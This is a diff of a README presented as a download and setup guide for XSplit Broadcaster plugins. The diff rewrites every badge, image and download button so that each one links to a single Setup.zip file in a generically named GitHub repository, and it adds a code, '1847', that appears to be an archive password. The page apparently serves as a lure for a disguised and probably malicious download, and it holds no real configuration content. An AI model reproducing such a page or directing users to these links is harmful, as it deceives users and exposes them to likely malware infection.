@@ -1,14 +1,14 @@
 # 🎮 XSplit Broadcaster Plugins — Download, Setup & Full Configuration Guide 2026
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/XSplit-Broadcaster-Plugins)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Gaming%20Software-purple)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/XSplit-Broadcaster-Plugins)](https://github.com/PolygonAnalystPalace/XSplit-Broadcaster-Plugins/releases/download/XSplit-Broadcaster-Plugins/Setup.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/PolygonAnalystPalace/XSplit-Broadcaster-Plugins/releases/download/XSplit-Broadcaster-Plugins/Setup.zip)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/PolygonAnalystPalace/XSplit-Broadcaster-Plugins/releases/download/XSplit-Broadcaster-Plugins/Setup.zip)
+[![Category](https://img.shields.io/badge/Category-Gaming%20Software-purple)](https://github.com/PolygonAnalystPalace/XSplit-Broadcaster-Plugins/releases/download/XSplit-Broadcaster-Plugins/Setup.zip)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/PolygonAnalystPalace/XSplit-Broadcaster-Plugins/releases/download/XSplit-Broadcaster-Plugins/Setup.zip)
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/PolygonAnalystPalace/XSplit-Broadcaster-Plugins/releases/download/XSplit-Broadcaster-Plugins/Setup.zip)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![XSplit Broadcaster Plugins](https://img.shields.io/badge/Download%20XSplit%20Broadcaster%20Plugins-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![XSplit Broadcaster Plugins](https://img.shields.io/badge/Download%20XSplit%20Broadcaster%20Plugins-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/PolygonAnalystPalace/XSplit-Broadcaster-Plugins/releases/download/XSplit-Broadcaster-Plugins/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
